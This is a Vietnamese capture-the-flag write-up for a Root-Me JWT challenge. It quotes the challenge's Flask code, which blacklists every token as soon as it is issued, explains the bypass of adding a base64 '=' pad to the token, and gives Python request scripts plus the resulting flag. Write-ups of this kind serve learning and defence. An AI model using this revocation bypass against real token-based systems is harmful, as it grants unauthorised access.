# JWT - Revoked token

## Discription 

Two endpoints are available :

- POST : /web-serveur/ch63/login
- GET : /web-serveur/ch63/admin

Get an access to the admin endpoint.

## Solution

Bài cho source code nên việc đầu tiên cần làm sẽ là đi mổ sẻ cái này .

```
def login():
    try:
        username = request.json.get('username', None)
        password = request.json.get('password', None)
    except:
        return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
 
    if username != 'admin' or password != 'admin':
        return jsonify({"msg": "Bad username or password"}), 401
 
    access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
    ret = {
        'access_token': access_token,
    }
   
    with lock:
        blacklist.add(access_token)
 
    return jsonify(ret), 200
```

Đầu tiên login() , hàm này làm nhiệm vụ tạo cho ta một cái token có thời hạn 3 phút để xác thực và cụ thể ở đây ta cần gửi một user = admin và pass = admin . Sẽ chẳng có gì đáng nói nếu hàm này ko thực hiện thêm một công việc đó là thêm cái token này vào blacklist .  

```
def delete_expired_tokens():
    with lock:
        to_remove = set()
        global blacklist
        for access_token in blacklist:
            try:
                jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
            except:
                to_remove.add(access_token)
       
        blacklist = blacklist.difference(to_remove)
```

Hiểu đơn giản đây là một hàm dùng để xóa những token hết hạn và nó sẽ được gọi sau mỗi 10s .

```
def protected():
    access_token = request.headers.get("Authorization").split()[1]
    with lock:
        if access_token in blacklist:
            return jsonify({"msg":"Token is revoked"})
        else:
            return jsonify({'Congratzzzz!!!_flag:': FLAG})
```

Hàm này sẽ kiểm tra token có trong blacklist hay ko nếu không thì nó sẽ đưa flag cho ta . 

Nhận định ban đầu để pass thì ta cần có một token ko có trong blacklist nhưng ngay từ khi được tạo thì token đã được thêm vào blacklist và chỉ đc xóa đi khi hết hạn khi ấy thì nó lại không còn hợp lệ nữa khá khó khăn để giải quyết vấn đề này .

Tuy nhiên có một lối thoát đó là:
+ Tất cả các phần của JWT đều được encode base64 .
+ Base64 có một đặc trưng đó là trong quá trình mã hóa sẽ xảy ra một số trường hợp thừa thiếu bit để giải quyết vấn đề này người ta tạo ra phần đệm *=* để xác định chiều dài mã hóa và ko làm ảnh hưởng đến việc mã hóa .(https://en.wikipedia.org/wiki/Base64). Thực ra mk cũng chưa hiểu lắm cơ mà đại loại là ta có thể thêm dấu *=* vào cuối chuỗi base64 mà ko làm thay đổi nó.
Từ hai điều trên chúng ta chỉ cần thêm đấu bằng vào cuối token nhận đc từ enpoint /login là bypass thành công.

Trước tiên là code python tạo client request với post lấy token (lưu ý là phải có "Content-Type": "application/json" ):

```
import requests

url = "http://challenge01.root-me.org/web-serveur/ch63/login"

header = {"Content-Type": "application/json"}
data = '{"username":"admin","password":"admin"}'

res = requests.post(url, data=data, headers=header)

print(res.text) 
```

> {"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MjQ0NDIyMDgsIm5iZiI6MTYyNDQ0MjIwOCwianRpIjoiYTc5MjFlZTctNjZlNy00MjVkLWFjYjYtMWUwOGE4N2EwNjQ3IiwiZXhwIjoxNjI0NDQyMzg4LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.0cwbnn0fuutn09i2THwujzZ_YsV1HKQQsWGH3UeUFh0"}

Tiếp theo là sửa token (add =) và gửi lên endpont /admin .

```
import requests

url = "http://challenge01.root-me.org/web-serveur/ch63/admin"

header = {"Content-Type": "application/json","Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MjQ0NDIyMDgsIm5iZiI6MTYyNDQ0MjIwOCwianRpIjoiYTc5MjFlZTctNjZlNy00MjVkLWFjYjYtMWUwOGE4N2EwNjQ3IiwiZXhwIjoxNjI0NDQyMzg4LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.0cwbnn0fuutn09i2THwujzZ_YsV1HKQQsWGH3UeUFh0="}

res = requests.get(url,headers=header)

print(res.text)

```

## Flag

 {"Congratzzzz!!!_flag:":"Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld"}


